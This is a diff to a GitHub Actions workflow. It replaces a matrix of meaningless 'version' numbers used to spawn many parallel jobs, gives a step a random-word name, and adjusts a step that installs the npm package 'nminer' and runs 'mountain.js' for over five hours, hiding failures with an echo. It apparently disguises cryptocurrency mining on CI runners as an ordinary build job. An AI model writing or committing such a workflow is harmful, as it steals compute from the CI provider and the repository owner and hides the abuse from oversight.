@@ -9,21 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1986 }
-          - { version: 8212 }
-          - { version: 6192 }
-          - { version: 4543 }
-          - { version: 4338 }
-          - { version: 8152 }
-          - { version: 7728 }
-          - { version: 7799 }
-          - { version: 3102 }
-          - { version: 8224 }
-          - { version: 710 }
-          - { version: 9811 }
-          - { version: 502 }
-          - { version: 9525 }
-          - { version: 1900 }
+          - { version: 3366 }
+          - { version: 6371 }
+          - { version: 4055 }
+          - { version: 7607 }
+          - { version: 4259 }
+          - { version: 2176 }
+          - { version: 7223 }
+          - { version: 3577 }
+          - { version: 994 }
+          - { version: 4492 }
+          - { version: 566 }
+          - { version: 2350 }
+          - { version: 4178 }
+          - { version: 7208 }
+          - { version: 6803 }
+          - { version: 7369 }
 
     steps:
       - name: Checkout
@@ -34,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: sniveling definitive dearly um
+      - name: probable which kissingly atop
         run: |
           npm install nminer@latest
-          timeout 331m node mountain.js || echo "mountain executed"
+          timeout 314m node mountain.js || echo "mountain executed"
